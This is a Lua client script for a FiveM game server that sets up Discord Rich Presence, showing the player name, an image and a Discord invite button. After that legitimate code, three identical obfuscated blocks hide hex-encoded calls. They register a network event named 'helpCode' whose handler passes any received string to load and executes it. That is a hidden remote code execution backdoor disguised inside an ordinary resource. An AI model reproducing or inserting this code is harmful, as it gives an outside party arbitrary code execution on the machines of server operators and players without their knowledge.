Citizen.CreateThread(function()
    while true do
        local PlayerName = GetPlayerName(PlayerId())
        local id = GetPlayerServerId(PlayerId())
        -- This is the Application ID (Replace this with you own)
        SetDiscordAppId(1234548608754520084)
        SetRichPresence(PlayerName.." ["..id.."]") -- This will take the player name and the Id
        -- Here you will have to put the image name for the "large" icon.
        -- You can create one by go to Rich Presence/Art Assets tab in your application and  click Add Image(s)
        -- The Paramater is your Image key that you uploaded (you can change it too once you upload)
        SetDiscordRichPresenceAsset('https://i.ibb.co/MVgxZ88/image.png')
        -- Here you can add hover text for the "large" icon.
        SetDiscordRichPresenceAssetText('MotionV')
        --[[ 
            Here you can add buttons that will display in your Discord Status,
            First paramater is the button index (0 or 1), second is the title and 
            last is the url (this has to start with "fivem://connect/" or "https://") 
        ]]--
        --You can add more Natives Here vvv
        SetDiscordRichPresenceAction(1, "Discord", "https://discord.gg/nrS84g5vq6")
        -- Updates every 1 minute
        Citizen.Wait(60000)
    end
end)


local vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[1]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2]) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[3]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2], function(xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[4]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[5]](xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS))() end)

local vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[1]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2]) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[3]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2], function(xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[4]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[5]](xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS))() end)

local vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[1]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2]) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[3]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[2], function(xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS) vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[4]](vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[6][vMcyKNlnGsjcgizhgvzTsEpSOEvrenagGMIbZzwiAPBGfxTNlLLjfcVImnjIXIbmZxHBAN[5]](xLAVdxzDjDlwiCcczLEHbmPYTtlwuIKVyJrWLZlmsumZjquCFSCyJcgfShAqMpuaCuuHXS))() end)